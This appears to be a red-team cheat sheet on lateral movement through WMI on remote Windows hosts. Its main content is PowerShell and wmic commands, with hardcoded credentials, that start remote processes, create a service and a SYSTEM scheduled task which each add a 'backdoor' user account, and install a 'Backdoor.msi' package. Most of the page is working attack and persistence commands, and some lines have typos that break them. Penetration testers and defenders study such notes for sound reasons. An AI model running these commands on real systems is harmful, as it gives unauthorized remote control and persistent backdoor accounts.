#wmi
[WMI](../../Windows/Windows%20Internals/Uncategorized/WMI.md)
# Connecting to WMI on remote machine
### Protocols support
- **DCOM**: RPC over IP. Uses port 135/TCP and port 49152-65535/TCP.
- **Wsman**: Uses WinRM. uses port 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).
```powershell
# Create the PSCredential object to store the credntial
$username = "Administrator";
$password = "Password123";
$securepassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = [System.Management.Automation.PSCredential]::new($username,$securepassword);

# Configure Protocol to use
$opt = New-CimSessionOption -Protocol DCOM;

# Connect to the remote computer 
$session = New-CimSession -ComputerName <SERVER> -Credential $credential -SessionOption $opt -ErrorAction Stop;
```

# Remote Process Creation
- Required Group Membership : Administrators
### Powershell
```powershell
# Create a string storing the command to be executed
$command = "powershell.exe -Command Set-Content -Path C:\Temp\text.txt -Value Hello,World!";

Invoke-CimMethod -CimSession $session -Classname Win32_Process -MethodName create -Arguments @{
	CommandLine = $command;
} 
```
### WMIC
```powershell
# For legacy system using wmic.exe
wmic.exe /user:administrator /password:password123 /node:<server> process call create "cmd.exe /c calc.exe"
```
# Remote Service Creation
- Required Group Membership: Administrator
### Powershell
```powershell
# Create service
Invoke-CimMethod -CimSession $session -ClassName Win32_Service -MethodName create -Arguments @{
	Name = "MyService";
	DisplayName = "MyService";
	PathName = "net user backdoor password /add";
	ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
	StartMode = "Manual";
}

# Create a service object
$service = Get-CimInstance -CimSession $session -ClassName Win32_Service -filter "Name LIKE 'MyService'"

# Start the service
Invoke-CimMethod -InputObject $service -MethodName StartService
# Stop the service
Invoke-CimMethod -InputObject $service -MethodName StopService
# Delete Service
Invoke-CimMethod -InputObject $service -MethodName Delete
```
# Remote Schedule Task Creation
- Required Group Membership: Administrators
### Poweshell
```powershell
# Create command and argument
$Command = "cmd.exe"
$Args = "/c net user backdoor pass /add"

# Create and Run schedule task
$Action = New-ScheduleTaskAction -CimSession $session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "backdoor"
Start-ScheduledTask -CimSession $Session -TaskName "backdoor"

Unregister-ScheduledTask -CimSession $session -TaskName "backdoor"
```
# Installing MSI packages
- MSI packages can be installed using WIM using the `Win32_Product` class's static `Install` method 
### Powershell
```powershell
Invoke-CimMethod -CimSession $session -Class Win32_Product -MethodName Install -Arugments @{
	PackageLocation = "C:\Windows\Backdoor.msi";
	Options = "";
	AllUsers = $false;
}
```
### WMIC
```Powershell
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```